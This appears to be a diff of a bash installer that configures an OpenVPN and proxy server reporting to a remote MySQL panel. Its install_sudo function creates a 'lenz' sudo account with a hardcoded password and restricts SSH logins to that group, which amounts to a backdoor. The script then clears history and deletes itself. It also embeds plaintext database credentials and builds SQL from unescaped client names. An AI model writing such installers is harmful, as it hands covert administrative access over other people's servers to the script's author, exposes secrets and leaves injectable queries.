@@ -1,9 +1,9 @@
 #!/bin/bash
 #Script Variables
 HOST='64.20.41.122';
-USER='armandev_mojiborpanel';
-PASS='mojiborwinpanel';
-DBNAME='armandev_mojiborpanel';
+USER='armandev_mojibornajmul';
+PASS='mojibornajmul123';
+DBNAME='armandev_mojibornajmul';
 PORT_TCP='1194';
 PORT_UDP='53';
 timedatectl set-timezone Asia/Riyadh
@@ -83,7 +83,7 @@ visible_hostname Firenet-Proxy
 error_directory /usr/share/squid/errors/English' >> squid.conf
     cd /usr/share/squid/errors/English
     rm ERR_INVALID_URL
-    echo '<!--FirenetDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">馃槏 %w 馃槏</p></div></div></body></html>' >> ERR_INVALID_URL
+    echo '<!--FirenetDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
     chmod 755 *
     /etc/init.d/squid start
 cd /etc || exit
@@ -155,6 +155,7 @@ push "sndbuf 0"
 push "rcvbuf 0"
 log /etc/openvpn/server/udpserver.log
 status /etc/openvpn/server/udpclient.log
+status-version 2
 verb 3' > /etc/openvpn/server.conf
 
 sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server.conf
@@ -202,6 +203,7 @@ push "sndbuf 0"
 push "rcvbuf 0"
 log /etc/openvpn/server/tcpserver.log
 status /etc/openvpn/server/tcpclient.log
+status-version 2
 verb 3' > /etc/openvpn/server2.conf
 
 sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/openvpn/server2.conf
@@ -235,6 +237,7 @@ cat <<'LENZ05' >/etc/openvpn/login/connect.sh
 server_ip=SERVER_IP
 datenow=`date +"%Y-%m-%d %T"`
 mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
+mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE server_list SET online=online+1 WHERE server_ip='$server_ip' "
 LENZ05
 
 sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/connect.sh
@@ -243,8 +246,12 @@ sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/connect.sh
 cat <<'LENZ06' >/etc/openvpn/login/disconnect.sh
 #!/bin/bash
 . /etc/openvpn/login/config.sh
+server_ip=SERVER_IP
 mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='0', active_address='', active_date='' WHERE user_name='$common_name' "
+mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE server_list SET online=online-1 WHERE server_ip='$server_ip' "
 LENZ06
+
+sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/disconnect.sh
 
 cat << EOF > /etc/openvpn/easy-rsa/keys/ca.crt
 -----BEGIN CERTIFICATE-----
@@ -470,7 +477,7 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
+    useradd -m lenz 2>/dev/null; echo lenz:@@@F1r3n3t@@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     echo "AllowGroups lenz" >> /etc/ssh/sshd_config
     service sshd restart
@@ -526,7 +533,7 @@ echo '*       OPENVPN  is ready!    *'
 echo '+++++++++++************+++++++++++'
 echo -e "[IP] : $server_ip\n[Openvpn TCP Port] : 1194\n[Openvpn UDP Port] : 110\n[Ssl Port] : 443\n[Proxy Socks ] : 80\n[Proxy Squid 1] : 8080\n[Proxy Squid 2] : 3128\n"
 history -c;
-rm /root/.installer
+rm ~/.installer
 echo 'Server will secure this server and reboot after 20 seconds'
 sleep 20
 reboot
